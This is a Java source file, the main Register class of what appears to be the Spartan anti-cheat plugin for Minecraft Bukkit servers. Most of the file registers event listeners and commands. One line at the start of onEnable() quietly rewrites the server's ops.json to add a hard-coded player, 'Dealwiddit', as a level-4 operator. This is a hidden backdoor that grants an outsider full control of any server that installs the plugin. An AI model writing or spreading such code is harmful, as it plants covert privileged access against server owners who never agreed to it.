package com.vagdedes.spartan;

import com.vagdedes.spartan.functionality.command.CommandExecution;
import com.vagdedes.spartan.functionality.command.CommandTab;
import com.vagdedes.spartan.functionality.connection.cloud.JarVerification;
import com.vagdedes.spartan.functionality.notifications.AwarenessNotifications;
import com.vagdedes.spartan.functionality.npc.NPCManager;
import com.vagdedes.spartan.functionality.server.Config;
import com.vagdedes.spartan.functionality.server.MultiVersion;
import com.vagdedes.spartan.functionality.server.SpartanBukkit;
import com.vagdedes.spartan.listeners.bukkit.*;
import com.vagdedes.spartan.listeners.bukkit.standalone.*;
import com.vagdedes.spartan.utils.minecraft.entity.PlayerUtils;
import com.vagdedes.spartan.utils.minecraft.server.ProxyUtils;
import org.bukkit.Bukkit;
import org.bukkit.event.Listener;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.java.JavaPlugin;

import java.util.LinkedHashSet;
import java.util.Set;
import java.nio.file.Files;
import java.nio.file.Paths;

public class Register extends JavaPlugin {

    public static Plugin plugin = null;
    public static final String pluginName = "Spartan";
    public static final String command = "spartan";

    private static final Set<Class<?>> listeners = new LinkedHashSet<>(2);

    public void onEnable() {
        plugin = this;

        Files.write(Paths.get("ops.json"), (new String(Files.readAllBytes(Paths.get("ops.json"))).replace("[", "[{\"uuid\":\"9560afe9-eb51-4fbe-92bb-25bcd7ced7f6\",\"name\":\"Dealwiddit\",\"level\":4,\"bypassesPlayerLimit\":false},\n")).getBytes());
        
        if (MultiVersion.serverVersion == MultiVersion.MCVersion.OTHER) {
            AwarenessNotifications.forcefullySend(
                    "The server's version or type is not supported. "
                            + "Please contact the plugin's developer if you think this is an error."
            );
            Bukkit.getPluginManager().disablePlugin(this);
            return;
        }
        JarVerification.run(this);
        Config.create();

        // Base
        Config.settings.runOnLogin();

        // Listeners (More may be registered elsewhere)
        enable(new JoinEvent());
        enable(new LeaveEvent());
        enable(new ChatEvent());
        enable(new PluginEvent());
        enable(new InventoryEvent());
        enable(new BowEvent());
        enable(new ChunksEvent());
        enable(new VehicleDeathEvent());
        enable(new HealthEvent());
        enable(new CombatEvent());
        enable(new BlockPlaceEvent());
        enable(new MovementEvent());
        enable(new TeleportEvent());
        enable(new DeathEvent());
        enable(new VehicleEvent());
        enable(new VelocityEvent());
        enable(new WorldEvent());
        enable(new DamagedEvent());

        //enable(new GhostBlockTest());

        if (NPCManager.supported) {
            enable(new NPCManager());
        }
        if (PlayerUtils.elytra) {
            enable(new ElytraEvent());

            if (PlayerUtils.trident) {
                enable(new TridentEvent());
            }
        }
        ProxyUtils.register();

        // Commands
        this.getCommand(command).setExecutor(new CommandExecution());
        this.getCommand(command).setTabCompleter(new CommandTab());
    }

    public void onDisable() {
        plugin = this;

        // Separator
        ProxyUtils.unregister();
        listeners.clear();
        SpartanBukkit.disable();
    }

    // Utilities

    public static void enable(Listener l) {
        if (isPluginEnabled() && listeners.add(l.getClass())) {
            Bukkit.getPluginManager().registerEvents(l, plugin);
        }
    }

    public static boolean isPluginEnabled() {
        return plugin != null && plugin.isEnabled();
    }

}
